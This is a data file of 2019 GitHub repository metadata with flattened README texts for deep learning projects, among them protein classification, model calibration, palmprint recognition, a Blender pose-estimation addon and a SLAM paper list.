cheahengsoon,GlobalAINightsSept2019,n/a,Global AI Night Sept 2019 Intermediate Track Part 2 Crash course on building and accelerating deep learning solutions Learn the end to end process of building deep learning solutions from experimentation to deployment We will start by experimenting locally with different model architectures and hyperparameters using PyTorch Then well show you how to use Azure Machine Learning service to train models at massive scale in the cloud and seamlessly deploy them into production Part 1 Getting familiar with Deep Learning and PyTorch start html Part 2 Using Azure Machine Learning service to cloud accelerate deep learning clould html Import the project from https github com sethjuarez pytorchintro Create Machine Learning service workspace in Microsoft Azure Portal Go to Azure Notebooks and change the environments Requirements requirement txt and Python 3 6 Click the cloud ipynb Go to Kernel Change Kernel Python 3 6 Download config json file from Machine Learning Service Workspace and import to your Azure Notebooks Remember to change the VM Size to vmsize StandardDS15v2 in Cloud Compute section,2019-08-30T01:10:18Z,2019-09-06T02:10:05Z,HTML,cheahengsoon,User,1,2,1,11,master,cheahengsoon,1,0,0,0,0,0,0
eric4note,crf,n/a,Combining deep features and activity context via conditional random fields to improve activity recognition 1 To prepare data run prepareall py 2 To learn and infer with the model run predict py 3 The dataset for training and testing the C3D model can be found at https drive google com open id 1mEnLUrnElfbqmfmQWPaBK8V JX8zZsV 4 To visualize the results run viz py,2019-09-03T09:37:20Z,2019-12-11T08:29:43Z,Python,eric4note,User,1,2,0,5,master,eric4note,1,0,0,0,0,0,0
Mrjaggu,pfam_protein_sequence_classification,n/a,pfamrandomsplitproteinsequencclassification Pfam seed random split protein sequence multi class classification using deep learning visit blog on medium link https medium com jangidajay271 pfam seed random split protein sequence multi class classification using deep learning a0b172015c67 Introduction Understanding the relationship between amino acid sequence and protein function is a long standing problem in molecular biology with far reaching scientific implications Despite six decades of progress state of the art techniques cannot annotate 1 3 of microbial protein sequences hampering our ability to exploit sequences collected from diverse organisms To address this we report a deep learning model that learns the relationship between unaligned amino acid sequences and their functional classification across all 17929 families of the Pfam database Our model co locates sequences from unseen families in embedding space allowing sequences from novel families to be accurately annotated These results suggest deep learning models will be a core component of future protein function prediction tools Predicting the function of a protein from its raw amino acid sequence is the critical step for understanding the relationship between genotype and phenotype As the cost of DNA sequencing drops and metagenomic sequencing projects flourish fast and efficient tools that annotate open reading frames with the function will play a central role in exploiting this data Demo video of project alt text https github com Mrjaggu pfamrandomsplitproteinsequencclassification blob master gif gif you can find the flask css code for this in repo link here https github com Mrjaggu flask protein sequence 1 Business Real World Problem Classifying given protein sequence of amino acid to one of the family accession This model can be used for prediction of a given protein sequence of amino acid The model will generate a number of classes probability values corresponding to the number of class or family accession The highest probability value to the corresponding class will be the predicted class for that protein sequence of amino acid 2 Objectives Constraints Objective Our objective is to predict the given protein sequence of amino acid as accurate as possible Constraints Interpretability Interpretability is important for given protein sequence of amino acid it should predict correctly Latency Given protein sequence of amino acid it should predict correct class so there is no need for high latency Accuracy Our goal is to predict the given protein sequence of amino acid as accurate as possible Higher the test accuracy the better our model will perform in the real world 3 Performance Metric This is a multi class classification problem with 17929 different classes so we have considered two performance metrics Multi Class Log loss We have used deep learning model with the cross entropy layer in the end with 17929 softmax units so therefore our goal is to reduce the multi class log loss cross entropy loss Accuracy This tells us how accurately our model performs in predicting the expressions 4 Source Data The data is provided by kaggle so we can directly download from given link Kaggle link https www kaggle com googleai pfam seed random split 5 Data Overview The approach used to partition the data into training dev testing folds is a random split Training data should be used to train your models Dev development data should be used in a close validation loop maybe for hyperparameter tuning or model validation Test data should be reserved for much less frequent evaluations this helps avoid overfitting on your test data as it should only be used infrequently File content Each fold train dev test has a number of files in it Each of those files contains CSV on each line which has the following fields sequence HWLQMRDSMNTYNNMVNRCFATCIRSFQEKKVNAEEMDCTKRCVTKFVGYSQRVALRFAE familyaccession PF02953 15 sequencename C5K6N5PERM5 2887 alignedsequence HWLQMRDSMNTYNNMVNRCFATCI RS F QEKKVNAEE MDCT KRCVTKFVGYSQRVALRFAE familyid zf Tim10DDP Description of fields sequence These are usually the input features to your model Amino acid sequence for this domain There are 20 very common amino acids frequency 1 000 000 and 4 amino acids that are quite uncommon X U B O Z familyaccession These are usually the labels for your model Accession number in form PFxxxxx y Pfam where xxxxx is the family accession and y is the version number Some values of y are greater than ten and so y has two digits familyid One word name for the family sequencename Sequence name in the form uniprotaccessionid startindex endindex alignedsequence Contains a single sequence from the multiple sequence alignment with the rest of the members of the family in seed with gaps retained Generally the familyaccession the field is the label and the sequence or aligned sequence is the training feature This sequence corresponds to a domain not a full protein The contents of these fields are the same as to the data provided in Stockholm format by PFam atftp ftp ebi ac uk pub databases Pfam releases Pfam32 0 Pfam A seed gz 6 Libraries Package We have used almost all the library of deep learning that we used normally like pandas numpy sklearn Keras etc We can install by simply using pip install specify package name here 7 Pre processing Featurization We have done some pre processing like lowercase the sequence and have used max sequence length of 100 and converting text data into numerical form by using sklearn countvectorizer or else our defined function of creating a dictionary and mapping char to index form and index to char form 8 Modelling and Training So finally we have reached to our last process of model fit So hereby we have completed 90 of the process So our main objective here is to give a protein sequence one by one and reduce cross entropy loss We have designed our own neural network architecture as follow Let s understand the architecture As we can see we have input shape 100 24 i e None 100 24 since we have max sequence length of 100 for every protein sequence of amino acid and its one hot encoded so its like for example for eg we have shape 1 2 3 so one hot encode of this look like 1 0 0 0 1 0 0 0 1 Here 1 describe where the char index is presented So in this way our all train test and dev data are encoded and represented From the architecture we can observe that we have 4 convolution layer of 1D Dense layer Maxpooling layer Dropout layer BatchNormalization layer Activation and Flatten layer We have specified weight initialization If you do not specify the weight initialization method explicitly in Keras it uses Xavier initialization also known as Glorot initialization The aim of all these weight initializers is to find a good variance for the distribution from which the initial parameters are drawn About convolution layer X Conv1D 32 1 strides 1 padding valid name conv1d1 kernelinitializer glorotuniform seed 0 inputs Here 32 specify 32 filters with a kernel size of 1 since we have used a various filter in convolution layer so that network learned better parameter We have used padding valid therefore there will be no padding We have used dropout layer between convolution layer since it helps to prevent overfitting Here we have used different dropout rate i e 0 5 defined that 0 5 of nodes will be dropped during the forward and backward pass since no parameter are learned during backpropagation Since the network temporarily removes the units from the connections and removal of the number of nodes for connection is random So we can get an optimal dropout rate by hyper tuning or using various dropout rate In our case I observed during epochs we were overfitting so I tried with small to large dropout rate to avoid overfitting 0 10 5 After that we have a max pooling layer where features are reduced in a meaningful way which helps in downsample of convolution layer and as we know the advantages like location invariance scale invariance of a max pool layer In our network we have used a 1D max pool layer of size 2 while iterating through a feature map To understand more about the convolutional neural network and layers visit this link Finally we have a dense layer which contains relu activation units Since the output layer contains 2910 softmax units It will generate 2910 class probability which is sum to 1 We will minimize the loss by feeding it back during backpropagation So in this way our neural network model will get trained to classify the protein sequences Training for 100 epochs without hyper tuning the network I got the following results After tuning dropout adding max pooling layer and batch normalization I got the test accuracy of 99 So how I achieved more than 90 accuracy below different model with hyperparameter tuning images loss png images accuracy png 9 Test Results As we had data in a format of train test dev So we used test data to check the accuracy After testing we got these final results score model evaluate finaltest ytest verbose 1 print Test loss score 0 print Test accuracy score 1 output 7316 7316 2s 251us step Test loss 0 0511749743080253 Test accuracy 0 9922886276653909 10 Testing on Real World For testing the same process needs to follow Pre processing lowercase the sequence and taking the max sequence length of 100 Mapping char to index or numerical form Using our model for the final prediction of a protein sequence of amino acid 11 Further Scope Since we have got a good result but it can get more improved In order to get more accuracy model can be trained on a large data set By some more hyperparameter tuning more accuracy can be achieved It can be used for other protein sequences classification problem by tuning or increasing the complexity of the model 12 Reference https www appliedaicourse com https www biorxiv org content 10 1101 626507v3 full https arxiv org abs 1606 01781 https www kaggle com googleai pfam seed random split,2019-08-07T06:10:14Z,2019-11-07T16:40:08Z,CSS,Mrjaggu,User,1,2,0,14,master,Mrjaggu,1,0,0,0,0,1,0
parhamzm,FinalProject,n/a,FinalProject This repository is for my Final Project in university of Kashan in case of Deep Learning Article,2019-09-16T09:54:56Z,2019-11-24T20:54:11Z,n/a,parhamzm,User,1,2,0,1,master,parhamzm,1,0,0,0,0,0,0
mlaves,bayesian-temperature-scaling,n/a,Well calibrated Model Uncertainty with Temperature Scaling for Dropout Variational Inference Authors Max Heinrich Laves Sontje Ihler Karl Philipp Kortmann Tobias Ortmaier To appear at 4th workshop on Bayesian Deep Learning Neural Information Processing Systems NeurIPS 2019 https arxiv org abs 1909 13550 https arxiv org abs 1909 13550 Abstract Model uncertainty obtained by variational Bayesian inference with Monte Carlo dropout is prone to miscalibration The uncertainty does not represent the model error well In this paper temperature scaling is extended to dropout variational inference to calibrate model uncertainty Expected uncertainty calibration error UCE is presented as a metric to measure miscalibration of uncertainty The effectiveness of this approach is evaluated on CIFAR 10 100 for recent CNN architectures After calibration classification error is decreased by rejecting data samples with high uncertainty Experimental results show that temperature scaling considerably reduces miscalibration by means of UCE and enables robust rejection of uncertain predictions The proposed approach can easily be derived from frequentist temperature scaling and yields well calibrated model uncertainty It is simple to implement and does not affect the model accuracy Contact Max Heinrich Laves laves imes uni hannover de mailto laves imes uni hannover de MaxLaves https twitter com MaxLaves Appelstr 11A 30167 Hannover Germany,2019-09-07T08:39:06Z,2019-12-12T01:39:00Z,Jupyter Notebook,mlaves,User,1,2,1,10,master,mlaves,1,0,0,0,0,0,0
harshnsdalai,i_attend,n/a,,2019-08-28T12:41:08Z,2019-09-22T18:38:20Z,Python,harshnsdalai,User,1,2,1,24,master,harshnsdalai,1,0,0,0,0,0,0
zhangxiaoyu11,OmiVAE,n/a,OmiVAE Integrated Multi omics Analysis Using Variational Autoencoders Application to Pan cancer Classification Xiaoyu Zhang Jingqing Zhang Kai Sun Xian Yang Chengliang Dai Yike Guo Accepted by 2019 IEEE International Conference on Bioinformatics and Biomedicine IEEE BIBM 2019 Paper Link arXiv https arxiv org abs 1908 06278 End to end deep learning model for low dimensional latent space extraction and multi class classification on multi omics datasets,2019-08-11T12:16:26Z,2019-10-11T15:50:41Z,Python,zhangxiaoyu11,User,1,2,1,3,master,zhangxiaoyu11,1,0,0,0,0,0,0
sourcecode369,TensorFlow-2.0,deep-neural-networks#machine-learning-algorithms#tensorflow-2#tensorflow-ecosystem,TensorFlow 2 0 Colaboratory Notebooks tensorflow https miro medium com max 4928 1 QTg 71YF0SVshMEaKZg png Documentation Documentation https img shields io badge api reference blue svg https www tensorflow org apidocs TensorFlow https www tensorflow org is an end to end open source platform for machine learning It has a comprehensive flexible ecosystem of tools https www tensorflow org resources tools libraries https www tensorflow org resources libraries extensions and community https www tensorflow org community resources that lets researchers push the state of the art in ML and developers easily build and deploy ML powered applications TensorFlow was originally developed by researcher and engineers working on the Google Brain team within Google s Machine Intelligence Research organization for the purposes of conducting machine learning and deep neural networks research The system is general enough to be applicable in a wide variety of other domains as well TensorFlow provides stable Python https www tensorflow org apidocs python and C https www tensorflow org apidocs cc APIs as well as non guaranteed backwards compatible API for other languages https www tensorflow org apidocs Keep up to date with release announcements and security updates by subscribing to announce tensorflow org https groups google com a tensorflow org forum forum announce See all the mailing lists https www tensorflow org community forums Install See the TensorFlow install guide https www tensorflow org install for the pip package https www tensorflow org install pip to enable GPU support https www tensorflow org install gpu use a Docker container https www tensorflow org install docker and build from source https www tensorflow org install source To install the current release for CPU only pip install tensorflow Use the GPU package for CUDA enabled GPU cards https www tensorflow org install gpu pip install tensorflow gpu Nightly binaries are available for testing using the tf nightly https pypi python org pypi tf nightly and tf nightly gpu https pypi python org pypi tf nightly gpu packages on PyPi Try your first TensorFlow program shell python python import tensorflow as tf tf enableeagerexecution tf add 1 2 numpy 3 hello tf constant Hello TensorFlow hello numpy Hello TensorFlow For more examples see the TensorFlow tutorials https www tensorflow org tutorials Contribution guidelines If you want to contribute to Tensorflow be sure to review the contribution guidelines CONTRIBUTING md This project adheres to TensorFlow s code of conduct CODEOFCONDUCT md By participating you are expected to uhold this code We use GitHub issues https github com tensorflow tensorflow issues for tracking requests and bugs please see TensorFlow Discuss https groups google com a tensorflow org forum forum discuss for general questions and discussion and please direct specific questions to Stack Overflow https stackoverflow com questions tagged tensorflow The TensorFlow project strives to abide by generally accepted best practices in open source software development CII Best Practices https bestpractices coreinfrastructure org projects 1486 badge https bestpractices coreinfrastructure org projects 1486 Contributor Covenant https img shields io badge Contributor 20Covenant v1 4 20adopted ff69b4 svg CODEOFCONDUCT md Continuous build status Official Builds Build Type Status Artifacts Linux CPU Status https storage googleapis com tensorflow kokoro build badges ubuntu cc svg https storage googleapis com tensorflow kokoro build badges ubuntu cc html pypi https pypi org project tf nightly Linux GPU Status https storage googleapis com tensorflow kokoro build badges ubuntu gpu py3 svg https storage googleapis com tensorflow kokoro build badges ubuntu gpu py3 html pypi https pypi org project tf nightly gpu Linux XLA Status https storage googleapis com tensorflow kokoro build badges ubuntu xla svg https storage googleapis com tensorflow kokoro build badges ubuntu xla html TBA MacOS Status https storage googleapis com tensorflow kokoro build badges macos py2 cc svg https storage googleapis com tensorflow kokoro build badges macos py2 cc html pypi https pypi org project tf nightly Windows CPU Status https storage googleapis com tensorflow kokoro build badges windows cpu svg https storage googleapis com tensorflow kokoro build badges windows cpu html pypi https pypi org project tf nightly Windows GPU Status https storage googleapis com tensorflow kokoro build badges windows gpu svg https storage googleapis com tensorflow kokoro build badges windows gpu html pypi https pypi org project tf nightly gpu Android Status https storage googleapis com tensorflow kokoro build badges android svg https storage googleapis com tensorflow kokoro build badges android html Download https api bintray com packages google tensorflow tensorflow images download svg https bintray com google tensorflow tensorflow latestVersion Raspberry Pi 0 and 1 Status https storage googleapis com tensorflow kokoro build badges rpi01 py2 svg https storage googleapis com tensorflow kokoro build badges rpi01 py2 html Status https storage googleapis com tensorflow kokoro build badges rpi01 py3 svg https storage googleapis com tensorflow kokoro build badges rpi01 py3 html Py2 https storage googleapis com tensorflow nightly tensorflow 1 10 0 cp27 none linuxarmv6l whl Py3 https storage googleapis com tensorflow nightly tensorflow 1 10 0 cp34 none linuxarmv6l whl Raspberry Pi 2 and 3 Status https storage googleapis com tensorflow kokoro build badges rpi23 py2 svg https storage googleapis com tensorflow kokoro build badges rpi23 py2 html Status https storage googleapis com tensorflow kokoro build badges rpi23 py3 svg https storage googleapis com tensorflow kokoro build badges rpi23 py3 html Py2 https storage googleapis com tensorflow nightly tensorflow 1 10 0 cp27 none linuxarmv7l whl Py3 https storage googleapis com tensorflow nightly tensorflow 1 10 0 cp34 none linuxarmv7l whl Community Supported Builds Build Type Status Artifacts Linux AMD ROCm GPU Nightly Build Status http ml ci amd com 21096 job tensorflow rocm nightly badge icon http ml ci amd com 21096 job tensorflow rocm nightly Nightly http ml ci amd com 21096 job tensorflow rocm nightly lastSuccessfulBuild Linux AMD ROCm GPU Stable Release Build Status http ml ci amd com 21096 job tensorflow rocm release badge icon http ml ci amd com 21096 job tensorflow rocm release Release http ml ci amd com 21096 job tensorflow rocm release lastSuccessfulBuild Linux s390x Nightly Build Status http ibmz ci osuosl org job TensorFlowIBMZCI badge icon http ibmz ci osuosl org job TensorFlowIBMZCI Nightly http ibmz ci osuosl org job TensorFlowIBMZCI Linux s390x CPU Stable Release Build Status http ibmz ci osuosl org job TensorFlowIBMZReleaseBuild badge icon https ibmz ci osuosl org job TensorFlowIBMZReleaseBuild Release https ibmz ci osuosl org job TensorFlowIBMZReleaseBuild Linux ppc64le CPU Nightly Build Status https powerci osuosl org job TensorFlowPPC64LECPUBuild badge icon https powerci osuosl org job TensorFlowPPC64LECPUBuild Nightly https powerci osuosl org job TensorFlowPPC64LECPUNightlyArtifact Linux ppc64le CPU Stable Release Build Status https powerci osuosl org job TensorFlowPPC64LECPUReleaseBuild badge icon https powerci osuosl org job TensorFlowPPC64LECPUReleaseBuild Release https powerci osuosl org job TensorFlowPPC64LECPUReleaseBuild Linux ppc64le GPU Nightly Build Status https powerci osuosl org job TensorFlowPPC64LEGPUBuild badge icon https powerci osuosl org job TensorFlowPPC64LEGPUBuild Nightly https powerci osuosl org job TensorFlowPPC64LEGPUNightlyArtifact Linux ppc64le GPU Stable Release Build Status https powerci osuosl org job TensorFlowPPC64LEGPUReleaseBuild badge icon https powerci osuosl org job TensorFlowPPC64LEGPUReleaseBuild Release https powerci osuosl org job TensorFlowPPC64LEGPUReleaseBuild Linux CPU with Intel MKL DNN Nightly Build Status https tensorflow ci intel com job tensorflow mkl linux cpu badge icon https tensorflow ci intel com job tensorflow mkl linux cpu Nightly https tensorflow ci intel com job tensorflow mkl build whl nightly Linux CPU with Intel MKL DNN Supports Python 2 7 3 4 3 5 3 6 and 3 7 Build Status https tensorflow ci intel com job tensorflow mkl build release whl badge icon https tensorflow ci intel com job tensorflow mkl build release whl lastStableBuild 1 14 0 pypi https pypi org project intel tensorflow Red Hat Enterprise Linux 7 6 CPU GPU Python 2 7 3 6 Build Status https jenkins tensorflow apps ci centos org buildStatus icon job tensorflow rhel7 3 6 build 2 https jenkins tensorflow apps ci centos org job tensorflow rhel7 3 6 2 1 13 1 pypi https tensorflow pypi thoth station ninja index Resources TensorFlow org https www tensorflow org TensorFlow tutorials https www tensorflow org tutorials TensorFlow official models https github com tensorflow models tree master official TensorFlow examples https github com tensorflow examples TensorFlow in Practice from Coursera https www coursera org specializations tensorflow in practice TensorFlow blog https blog tensorflow org TensorFlow Twitter https twitter com tensorflow TensorFlow YouTube https www youtube com channel UC0rqucBdTuFTjJiefW5t IQ TensorFlow roadmap https www tensorflow org community roadmap TensorFlow white papers https www tensorflow org about bib TensorBoard visualization toolkit https github com tensorflow tensorboard Learn more about the TensorFlow community https www tensorflow org community and how to contribute https www tensorflow org community contribute License General Public License 2 0 LICENSE Official TensorFlow Repository TensorFlow https github com tensorflow tensorflow,2019-09-03T07:11:50Z,2019-12-14T18:15:40Z,Jupyter Notebook,sourcecode369,User,0,2,0,92,master,sourcecode369#dependabot[bot],2,0,0,0,0,0,1
AngeloUNIMI,Demo_FusionNet,biometrics#cnn#finger-texture#less-constrained#palmprint-recognition#pca#touchless-biometrics,FusionNet for touchless palmprint and finger texture recognition using a webcam Demonstration source code using the webcam for touchless palmprint and finger texture recognition The algorithms used in the code are based on the paper A Genovese V Piuri F Scotti and S Vishwakarma Touchless palmprint and finger texture recognition A Deep Learning fusion approach 2019 IEEE Int Conf on Computational Intelligence Virtual Environments for Measurement Systems and Applications CIVEMSA 2019 Tianjin China June 14 16 2019 Project page http iebil di unimi it fusionnet index htm Outline Outline http iebil di unimi it fusionnet imgs outline png Outline Citation InProceedings civemsa19 author A Genovese and V Piuri and F Scotti and S Vishwakarma booktitle Proc of the 2019 IEEE Int Conf on Computational Intelligence Virtual Environments for Measurement Systems and Applications CIVEMSA 2019 title Touchless palmprint and finger texture recognition A Deep Learning fusion approach address Tianjin China month June day 14 16 year 2019 Main files launchDemoFusionNet m main file Main directories dirDB directory where template are stored models directory where pretrained models are saved Requirements A webcam The code is preconfigured to use an integrated webcam Change lines 51 52 of launchDemoFusionNet m to change webcam cam webcam integrated cam Resolution 640x480 Procedure https github com AngeloUNIMI DemoFusionNet blob master Instructions DemoFusionNet 20 20Instructions pdf Images Hand segmentation Outline https github com AngeloUNIMI DemoFusionNet blob master demoimages handsegmentation jpg raw true Hand segmentation Palmprint ROI extraction Outline https github com AngeloUNIMI DemoFusionNet blob master demoimages palmprintROIextraction jpg raw true Palmprint ROI extraction Part of the code uses the Matlab source code of the paper T Chan K Jia S Gao J Lu Z Zeng and Y Ma PCANet A Simple Deep Learning Baseline for Image Classification in IEEE Transactions on Image Processing vol 24 no 12 pp 5017 5032 Dec 2015 DOI 10 1109 TIP 2015 2475625 http mx nthu edu tw tsunghan Source 20codes html the template creation algorithms in A Genovese Source code for the 2019 IEEE CIVEMSA paper Touchless palmprint and finger texture recognition A Deep Learning fusion approach https github com AngeloUNIMI FusionNet the segmentation algorithms in A Genovese Source code for palmprint segmentation and ROI extraction used in the IEEE TIFS 2019 and IEEE CIVEMSA 2019 papers https github com AngeloUNIMI PalmSeg and the exportfig library Yair Altman exportfig 2018 https it mathworks com matlabcentral fileexchange 23629 exportfig,2019-09-18T07:24:18Z,2019-09-20T09:58:43Z,MATLAB,AngeloUNIMI,User,1,2,2,22,master,AngeloUNIMI,1,0,0,0,0,0,0
burakbaga,stock_pred_with_news_NLP,n/a,stockpredwithnewsNLP Making predictions for future news using machine learning and deep learning with Turkish news and shares Find the root of words by using zemberek nlp library for Turkish language processing,2019-08-07T07:15:26Z,2019-11-26T18:37:21Z,Jupyter Notebook,burakbaga,User,0,2,0,2,master,burakbaga,1,0,0,0,0,0,0
Fragrag,blender_lifting,n/a,blenderlifting 0 1 0 Introduction blenderlifting is a Blender addon that implements the functionality from Denis Tome research paper Lifting from the Deep Convolutional 3D Pose Estimation from a Single Image which uses machine learning to estimate a 3D pose from a 2D image More information can be found about this can be found in its GitHub repository https github com DenisTome Lifting from the Deep release and its associated research paper http openaccess thecvf com contentcvpr2017 papers TomeLiftingFromtheCVPR2017paper pdf Example https github com Fragrag blenderlifting blob master doc example png Installation To install this addon use git clone https github com Fragrag blenderlifting git to clone this repository to Blender s addon folder or download a zip version of this repository and unpack it in Blender s addon folder You should now have a blenderlifting folder in your addon folder Run the setupwindows sh bash script This will create the Python virtual environment blenderliftingvenv and install the required libraries with exception of the lifting module The lifting module comes included in a folder in the root of this repository After creating the virtual environment simply copy or move this folder to the virtual environment s module library In Windows this is will be in blenderliftingvenvLibsite packages Lifting From The Deep for Blender should now be installed properly Usage Once installed properly you can activate the addon in Blender in Edit Preferences Add Ons as Animation Blender Lifting The interface is then accessed when in Object Mode under Tools Interface https github com Fragrag blenderlifting blob master doc menu PNG Image path Location of the image to estimate 3D pose from Scale Scale of armature Armature name Name of armature Create an armature from a 2D image Press here to create the estimated 3D pose ADVANCED Probability Model Location of the probability model used by lifting ADVANCED Saved Sessions Location of the sessions used by lifting Requirements Software Blender 2 80 Python 3 7 3 Python libraries SciPy TensorFlow OpenCV Python Scikit Image Lifting and the dependencies of the libraries above FAQ Known issues Armature is not normalised The created armature is not normalised and will not be facing in a particular default direction As a result the base bone might be positioned oddly as well Non standard armature The created armature does not conform to any standard rigs or skeletons that I am aware of Consider the created armature as a starting point rather than a production ready asset My armature came out rather weird inaccurate blenderlifting relies on a machine learning model to estimate a 3D pose from a 2D image As such it might return an anatomically incorrect armature The estimation is also not 100 accurate and is more of an approximation It failed It crashed blenderlifting is still in its early days of development and can be very buggy Implementing a robust error catching is part of the future roadplan In the meantime make sure your image contains a single person with most if not all limbs clearly visible Also make sure that your Python 3 7 3 installation is added to your PATH variables as python Why do I need Python installed on my system when Blender has its Python installation While developing Blender s built in Python exhibited issues when running lifting s dependencies such as OpenCV and TensorFlow A workaround was created by having the add on launch a system level Python process to analyse the image rather than the built in Python Credits This addon uses a lightly modified version of Denis Tome s Lifting from the Deep Convolutional 3D Pose Estimation from a Single Image Notes Release notes,2019-09-08T16:31:00Z,2019-11-11T21:20:38Z,Python,Fragrag,User,1,2,1,7,master,Fragrag,1,1,1,0,0,0,0
biswajitcsecu,Polyp-Detection-and-Segmentation-from-Capsule-Endoscopy,n/a,Polyp Detection and Segmentation from Capsule Endoscopy To analyze the large scale CE data exams automatic image processing computer vision and learning algorithms An automatic polyp detection algorithms have been implineted with deep learning approach The polyp detection in colonoscopy in CE is a challenging problem still now,2019-09-11T10:44:52Z,2019-11-08T16:15:11Z,Jupyter Notebook,biswajitcsecu,User,2,2,1,2,master,biswajitcsecu,1,0,0,1,0,0,0
georgezoto,Convolutional-Neural-Networks,ai#alexnet#computer-vision#convolutional-neural-networks#deep-learning#deepface#facenet#fast-r-cnn#faster-r-cnn#googlenet-inception-network#lenet-5#machine-learning#network-in-network#neural-style-transfer#overfeat#r-cnn#resnet#vgg16#yolo#yolo9000,Convolutional Neural Networks Convolutional Neural Networks repository for all projects and programming assignments of Course 4 of 5 of the Deep Learning Specialization offered on Coursera and taught by Andrew Ng covering topics such as convolutional neural networks and classical architectures like LeNet 5 1998 AlexNet 2012 GoogleNet Inception Network 2014 VGG 16 2015 ResNet 2015 1x1 Convolutions 2014 OverFeat 2014 R CNN 2014 Fast R CNN 2015 Faster R CNN 2016 YOLO 2016 YOLO9000 2016 DeepFace 2014 FaceNet 2015 and Neural Style Transfer 2015 that propelled deep learning in new heights I loved implementing applications brining me one step closer to safe autonomous driving object detection accurate face recognition and automatic reading of radiology images The highlight of this course was using neural style transfer to generate art which as you can see below I had a wonderful time exploring using the Google Cloud Platform GCP Finally I learned how to apply these algorithms to a variety of image video and other 2D or 3D data using Keras and Tensorflow Convolutional Neural Networks and Classical Architectures see Papers 1986 Backprop Learning representations by back propagating errors Rumelhart Hinton Williams 1998 LeNet 5 GradientBased Learning Applied to Document Recognition LeCun Bottou Bengio Hanner 2012 AlexNet ImageNet Classification with Deep Convolutional Neural Networks Krizhevsky Sutskever Hinton 2014 GoogleNet Inception Network Going Deeper with Convolutions Szegedy et al 2015 VGG 16 Very Deep Convolutional Networks for Large Scale Image Recognition Simonyan Zisserman 2015 ResNet Deep Residual Learning for Image Recognition He Zhang Ren Sun 2014 1x1 Convolution Network In Network Lin Chen Yan 2014 OverFeat Integrated Recognition Localization and Detection using Convolutional Networks Sermanet Eigen Zhang Mathieu Fergus LeCun 2014 R CNN Rich feature hierarchies for accurate object detection and semantic segmentation Girshick Donahue Darrell Malik 2015 Fast R CNN Girshick 2016 Faster R CNN Towards Real Time Object Detection with Region Proposal Networks Ren He Girshick Sun 2016 YOLO You Only Look Once Unified Real Time Object Detection Redmond Divvala Girshick Farhadi 2016 YOLO9000 Better Faster Stronger Redmon Farhadi 2013 Visualizing and Understanding Convolutional Networks Zeiler Fergus 2014 DeepFace Closing the Gap to Human Level Performance in Face Verification Taigman Yang Ranzato Wolf 2015 FaceNet A Unified Embedding for Face Recognition and Clustering Schroff Kalenichenko Philbin 2015 A Neural Algorithm of Artistic Style Gatsys Ecker Bethge alt text images Convolutional Neural Networks 1 png alt text images Convolutional Neural Networks 3 png alt text images Convolutional Neural Networks 4 png alt text images Convolutional Neural Networks 5 png alt text images Convolutional Neural Networks 6 png alt text images Convolutional Neural Networks 9 png alt text images Convolutional Neural Networks 7 jpg alt text images Convolutional Neural Networks 10 png alt text images Convolutional Neural Networks 8 png https www youtube com watch v CmomhdylxmQ Links https www coursera org learn convolutional neural networks https www coursera org specializations deep learning https www deeplearning ai https www coursera org account accomplishments verify RVLXWK9HKTKH https www youtube com watch v CmomhdylxmQ,2019-08-08T03:03:02Z,2019-11-16T22:44:17Z,Jupyter Notebook,georgezoto,User,1,2,0,34,master,georgezoto,1,0,0,0,0,0,0
cogobuy,StatefulLSTMforecast,n/a,Stateful LSTM RNN forecast LSTM Stateful LSTM RNN forecast In the enterprise scenario the forecast of orders or shipments is usually an uncontrollable event of super difficulty if relying on deep learning neural networks using classical probability algorithms the feature vector guessing and data collection work will become Impossible and by using time series data that relies solely on orders or shipments through adopt stateful LSTM recurrent neural network by adjusting the time window to train the data regression prediction of the data can be achieved,2019-09-04T08:59:37Z,2019-09-22T13:33:53Z,Python,cogobuy,User,1,2,0,3,master,cogobuy,1,0,0,0,0,0,0
paulstreli,3D-Hand-Pose-Sequence-Data-Augmentation-using-GANs,n/a,3D Hand Pose Sequence Data Augmentation using GANs This repository contains the results for my final year project Abstract The human hand plays a crucial role in conveying emotions and carrying out most day to day activities Therefore numerous modern technologies ranging from gesture control to autonomous driving would benefit from the reliable recognition of certain hand actions This can be done using a two step approach in which first hand poses are obtained from video frames and then the resulting sequences are classified in the 3D skeleton space Existing techniques that aim to solve the second step are mostly based on deep learning methods Given the high complexity and dimensionality of the human hand these require large amounts of training data to achieve good performance As the collection of precisely annotated hand pose data is time consuming and expensive data augmentation appears as an advantageous practice to increase the recognition accuracy for a given classifier This thesis proposes a suitable WGAN GP architecture for the generation of synthetic hand skeleton sequences with variable length The recommended critic consists of a multi layer perceptron with three hidden layers while the generator is based on two RNNs and receives a start frame as input Both networks are conditioned on the action class The best performing model was trained on multiple classes simultaneously and selected based on the smallest generator loss When its synthetic samples were used to augment the training set of a 1 layer LSTM classifier the classification error on several subsets as well as on the complete dataset decreased Quantitative results show that the chosen GAN based data augmentation outperforms alternative standard methods Furthermore no clear correlation between the visual appearance of the generated samples and their resulting improvement on recognition accuracy was found,2019-09-08T21:15:42Z,2019-11-26T10:26:33Z,n/a,paulstreli,User,1,2,0,6,master,paulstreli,1,0,0,0,0,0,0
kabniz,SLAM-and-DeepLearning,n/a,arXiv Robot Localization in Floor Plans Using a Room Layout Edge Extraction Network IROS2019 https arxiv org abs 1903 01804 Localization of Unmanned Aerial Vehicles in Corridor Environments using Deep Learning https arxiv org abs 1903 09021 DeepTAM Deep Tracking and Mapping ECCV2018 http openaccess thecvf com contentECCV2018 papers HuizhongZhouDeepTAMDeepTrackingECCV2018paper pdf Learning to Reconstruct and Understand Indoor Scenes from Sparse Views https arxiv org abs 1906 07892 Indoor GeoNet Weakly Supervised Hybrid Learning for Depth and Pose Estimation https arxiv org abs 1811 07461 SLAM Probabilistic Data Association for Semantic SLAM https ieeexplore ieee org stamp stamp jsp tp arnumber 7989203 ICRA 2017 VSO Visual Semantic Odometry http openaccess thecvf com contentECCV2018 papers Konstantinos NektariosLianosVSOVisualSemanticECCV2018paper pdf ECCV 2018 Stereo Vision based Semantic 3D Object and Ego motion Tracking for Autonomous Driving http openaccess thecvf com contentECCV2018 papers PeiliangLIStereoVision basedSemanticECCV2018paper pdf ECCV 2018 Long term Visual Localization using Semantically Segmented Images https arxiv org pdf 1801 05269 ICRA 2018 DynaSLAM Tracking Mapping and Inpainting in Dynamic Scenes https ieeexplore ieee org stamp stamp jsp tp arnumber 8421015 IROS 2018 DS SLAM A Semantic Visual SLAM towards Dynamic Environments https arxiv org pdf 1809 08379 IROS 2018 SemanticFusion Dense 3D Semantic Mapping with Convolutional Neural Networks http wp doc ic ac uk bjm113 wp content uploads sites 113 2017 07 SemanticFusionICRA17CameraReady pdf ICRA 